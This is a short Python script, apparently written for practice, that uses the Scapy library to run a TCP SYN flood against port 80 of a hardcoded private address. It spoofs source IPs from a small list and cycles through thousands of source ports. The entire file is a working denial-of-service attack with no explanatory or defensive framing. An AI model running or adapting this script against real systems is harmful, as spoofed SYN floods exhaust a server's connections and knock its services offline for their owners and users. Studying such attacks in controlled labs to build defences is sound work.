#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author:M3rrio,time:2021/10/20

from scapy.all import *

tgt = "10.10.1.2"
print(tgt)
dPort=80

def synFlood(tgt,dPort):

    srcList = ["1.2.3.1","1.2.3.2","1.2.3.3","1.2.3.4"]

    for sPort in range(1024,65535):
        index = random.randrange(4)
        
        ipLayer = IP(src=srcList[index],dst=tgt)
        tcpLayer = TCP(sport=sPort,dport=dPort,flags="S")
        packet = ipLayer / tcpLayer
        send(packet)
        
synFlood(tgt,dPort)